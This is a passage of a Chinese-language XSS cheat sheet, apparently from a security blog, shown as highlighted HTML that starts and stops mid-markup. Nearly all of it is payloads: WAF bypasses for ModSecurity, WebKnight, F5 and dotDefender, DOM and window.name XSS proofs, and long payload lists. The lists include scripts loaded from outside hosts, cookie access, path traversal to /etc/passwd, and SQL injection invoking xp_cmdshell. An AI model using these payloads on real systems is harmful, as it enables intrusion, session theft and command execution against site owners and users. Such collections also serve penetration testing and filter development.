class="string">&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;</span>&gt;</span>rhainfosec</span><br><span class="line"></span><br><span class="line">2.4.11缺少X-frame选项</span><br><span class="line">通常会认为X-frame是用来防护点击劫持的配置，其实也可以防护使用iframe引用的xss漏洞</span><br><span class="line">Docmodes</span><br><span class="line">IE引入了doc-mode很长时间，提供给老版本浏览器的后端兼容性，有风险，攻击情景是黑客可以引用你站点的框架，他可以引入doc-mode执行css表达式</span><br><span class="line">expression(open(alert(1)))</span><br><span class="line">以下POC可以插入到IE7中</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span><span class="attr">content</span>=<span class="string">"IE=EmulateIE7"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframesrc="https:</span>//<span class="attr">targetwebsite.com</span>"&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">2.4.12Window.name欺骗</span><br><span class="line">情景：我们用iframe加载一个页面，我们可以控制窗口的名称，这里也可以执行javascript代码</span><br><span class="line">POC</span><br><span class="line"><span class="tag">&lt;<span class="name">iframesrc=&amp;#039;http:</span>//<span class="attr">www.target.com</span>?<span class="attr">foo</span>=<span class="string">"xss autofocus/AAAAA  onfocus=location=window.name//&amp;#039;</span></span></span><br><span class="line"><span class="tag"><span class="string">name="</span><span class="attr">javascript:alert</span>("<span class="attr">XSS</span>")"&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">DOM型XSS</span><br><span class="line">服务器不支持过滤DOM型的XSS，因为DOM型XSS总是在客户端执行，看一个例子：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    vari=location.hash;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.write(i);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">在一些情况下，反射型XSS可以转换成DOM型XSS：</span><br><span class="line">http://www.target.com/xss.php?foo=<span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">location</span>=<span class="string">/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]//#:()</span></span></span><br><span class="line"><span class="tag">上面的<span class="attr">POC</span>只在[<span class="attr">.</span>+都被允许的情况下适用，可以使用<span class="attr">location.hash</span>注入任何不允许的编码</span></span><br><span class="line"><span class="tag"><span class="attr">Location.hash</span>[<span class="attr">1</span>] = <span class="string">:</span>  // <span class="attr">Defined</span> <span class="attr">at</span> <span class="attr">the</span> <span class="attr">first</span> <span class="attr">position</span> <span class="attr">after</span>    <span class="attr">the</span> <span class="attr">hash.</span></span></span><br><span class="line"><span class="tag"><span class="attr">Location.hash</span>[<span class="attr">2</span>]= <span class="string">(</span>  // <span class="attr">Defined</span> <span class="attr">at</span> <span class="attr">the</span> <span class="attr">second</span> <span class="attr">position</span> <span class="attr">after</span>    <span class="attr">the</span> <span class="attr">has</span></span></span><br><span class="line"><span class="tag"><span class="attr">Location.hash</span>[<span class="attr">3</span>] = <span class="string">)</span> // <span class="attr">Defined</span>     <span class="attr">at</span> <span class="attr">third</span> <span class="attr">position</span> <span class="attr">after</span> <span class="attr">the</span> <span class="attr">hash.</span></span></span><br><span class="line"><span class="tag">如果有客户端过滤可能不适用</span></span><br><span class="line"><span class="tag">    </span></span><br><span class="line"><span class="tag"><span class="attr">2.4.13ModSecurity</span>绕过</span></span><br><span class="line">&lt;scri%00pt&gt;confirm(0);&lt;/scri%00pt&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>/<span class="attr">onmouseover</span>[\<span class="attr">x0b</span>]=<span class="string">location</span>=<span class="string">&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;</span>&gt;</span>rhainfosec</span><br><span class="line">参考http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html</span><br><span class="line">    </span><br><span class="line">2.4.14WEB KNIGHT绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">isindexaction=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1)type=image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span>/<span class="attr">onstart</span>=<span class="string">confirm(2)</span>&gt;</span></span><br><span class="line">F5 BIG IP ASM and Palo ALTO绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span> //IE6或者低版本Opera</span><br><span class="line">    “/&gt;<span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onfinish</span>=<span class="string">confirm(123)</span>&gt;</span>a<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line">Dot Defender绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">prompt(1);</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">"javas&amp;tab;cript:alert(1)"</span> <span class="attr">type</span>=<span class="string">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span>/<span class="attr">onstart</span>=<span class="string">confirm(2)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XSS-Payload杂烩"><a href="#XSS-Payload杂烩" class="headerlink" title="XSS Payload杂烩"></a>XSS Payload杂烩</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">'&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">='&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(vulnerable)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">%3Cscript%3Ealert('XSS')%3C/script%3E</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'XSS'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span></span><br><span class="line">%0a%0a<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(\"Vulnerable\")</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>.jsp</span><br><span class="line">%22%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span><br><span class="line">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span><br><span class="line">%3f.jsp</span><br><span class="line">%3f.jsp</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'Vulnerable'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'Vulnerable'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">?sql_debug=1</span><br><span class="line">a%5c.aspx</span><br><span class="line">a.jsp/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'Vulnerable'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">a/</span><br><span class="line">a?<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'Vulnerable'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'Vulnerable'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">';exec%20master..xp_cmdshell%20'dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt'--&amp;&amp;</span><br><span class="line">%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br><span class="line">%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span><br><span class="line">%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span><br><span class="line">1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=</span><br><span class="line">http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd</span><br><span class="line">..\..\..\..\..\..\..\..\windows\system.ini</span><br><span class="line">\..\..\..\..\..\..\..\..\windows\system.ini</span><br><span class="line">'';!--"<span class="tag">&lt;<span class="name">XSS</span>&gt;</span>=&amp;&#123;()&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">JaVaScRiPt:alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">JaVaScRiPt:alert(</span>"<span class="attr">XSS</span>")&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"jav ascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"jav ascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"jav ascript:alert('XSS');"</span>&gt;</span></span><br><span class="line">"<span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">java\0script:alert(\</span>"<span class="attr">XSS</span>\")&gt;</span>";' &gt; out</span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">" javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">a=<span class="regexp">/XSS/</span>alert(a.source)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">BACKGROUND</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">DYNSRC</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">LOWSRC</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BGSOUND</span> <span class="attr">src</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> <span class="attr">size</span>=<span class="string">"&amp;&#123;alert('XSS')&#125;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LAYER</span> <span class="attr">src</span>=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">layer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">'vbscript:msgbox("XSS")'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"mocha:[code]"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"livescript:[code]"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"refresh"</span> <span class="attr">CONTENT</span>=<span class="string">"0;url=javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">XSS</span>')&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FRAMESET</span>&gt;</span><span class="tag">&lt;<span class="name">FRAME</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">XSS</span>')&gt;</span><span class="tag">&lt;/<span class="name">FRAME</span>&gt;</span><span class="tag">&lt;/<span class="name">FRAMESET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TABLE</span> <span class="attr">BACKGROUND</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">"background-image: url(javascript:alert('XSS'))"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">"behaviour: url('http://www.how-to-hack.org/exploit.html');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">"width: expression(alert('XSS'));"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="undefined">@im\port'\ja\vasc\ript:alert("XSS")';</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">STYLE</span>=<span class="string">'xss:expre\ssion(alert("XSS"))'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">TYPE</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined">alert('XSS');</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">TYPE</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined">.XSS&#123;background-image:url("javascript:alert('XSS')");&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">A</span> <span class="attr">class</span>=<span class="string">"XSS"</span>&gt;</span><span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined">BODY&#123;background:url("javascript:alert('XSS')")&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BASE</span> <span class="attr">href</span>=<span class="string">"javascript:alert('XSS');//"</span>&gt;</span></span><br><span class="line">getURL("javascript:alert('XSS')")</span><br><span class="line">a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d);</span><br><span class="line"><span class="tag">&lt;<span class="name">XML</span> <span class="attr">src</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line">"&gt; <span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">"a();"</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;alert(<span class="string">'XSS'</span>);&#125;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br><span class="line">&lt;SCRIPT src="http://xss.ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"javascript:alert('XSS')"</span></span></span><br><span class="line">&lt;!--#exec cmd="/bin/echo '&lt;SCRIPT SRC'"--&gt;&lt;!--#exec cmd="/bin/echo '=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;'"--&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">"&gt;"</span> <span class="attr">src</span>=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> =<span class="string">"&gt;"</span> <span class="attr">src</span>=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">"&gt;"</span> '' <span class="attr">src</span>=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> "<span class="attr">a</span>=<span class="string">'&gt;'</span>" <span class="attr">src</span>=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">"&lt;SCRI"</span>);</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>PT src="http://xss.ha.ckers.org/a.js"&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">href</span>=<span class="string">http://www.gohttp://www.google.com/ogle.com/</span>&gt;</span>link<span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="按标签分类的XSS-Payload"><a href="#按标签分类的XSS-Payload" class="headerlink" title="按标签分类的XSS Payload"></a>按标签分类的XSS Payload</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">";alert(1);//xx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">¼script¾alert(¢XSS¢)¼/script¾   //US-ASCII编码，如Tomcat</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--[if gte IE 4]&gt;</span></span><br><span class="line"><span class="comment">&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;    //IE7以下</span></span><br><span class="line"><span class="comment">&lt;![endif]--&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span>aaaa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"JavaSCript:alealertrt%25281%2529"</span>&gt;</span>aaaa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span>  //无需js标签，可直接执行</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">background</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span>  //IE7以下</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">style</span>=<span class="string">"background-image: url(javascript:alert('XSS'))"</span>&gt;</span>  //IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">style</span>=<span class="string">"width: expression(alert('XSS'));"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="</span> <span class="attr">type</span>=<span class="string">"image/svg+xml"</span> <span class="attr">allowscriptaccess</span>=<span class="string">"always"</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span>  //Firefox/Chrome</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>    //Firefox/Chrome/Safari</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onmouseover</span>=<span class="string">"alert(document.cookie)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">'"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>  //IE</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span> <span class="attr">src</span>&gt;</span>  //IE</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">alt</span>=<span class="string">al</span> <span 